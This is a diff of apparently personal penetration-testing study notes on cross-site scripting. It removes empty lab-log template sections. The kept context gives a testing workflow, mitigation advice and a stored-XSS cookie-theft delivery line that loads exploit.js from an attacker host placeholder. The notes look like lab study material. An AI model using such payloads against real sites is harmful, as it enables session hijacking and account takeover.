@@ -68,9 +68,6 @@ Context-aware **output encoding** (HTML/attr/JS/URL), input validation, CSP, `Ht
 
 > Workflow: find the sink → confirm with `alert(window.origin)` → identify stored vs reflected (stored = far worse, hits everyone) → demo real impact with cookie theft. `HttpOnly` is the one flag that defuses cookie-stealing XSS.
 
-## My notes / lab output
-Filled in as I run these on lab targets.
-
 ## Full payload reference (source notes)
 Complete XSS payload set — nothing trimmed. Standard testing payloads; swap `OUR_IP`/`ATTACKER` for your host.
 
@@ -146,33 +143,3 @@ if (isset($_GET['c'])) {
 Delivery: inject `"><script src=http://OUR_IP/exploit.js></script>` in a stored field (e.g. an `imgurl=` parameter / registration awaiting admin review) → admin views it → cookie lands in `cookies.txt` → set the stolen cookie in your browser at `/login.php`. **Mitigation that kills it: `HttpOnly` cookie flag** (+ CSP, output encoding).
 
 Reference: PayloadsAllTheThings — XSS Injection.
-
-## 2. Setup
-- Attack box: (Pwnbox / Kali VM)
-- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
-
-## 3. Commands I used
-Each block says which machine it ran on.
-
-```bash
-# [ATTACK BOX]
-
-```
-
-```bash
-# [TARGET]
-
-```
-
-## 4. Confirmed (what worked)
-- 
-
-## 5. Tried, didn't work (and why)
-- 
-
-## 6. Open questions / revisit
-- 
-
-## 7. Cheat sheet lines
-Copied into `cheatsheets/`:
-- 
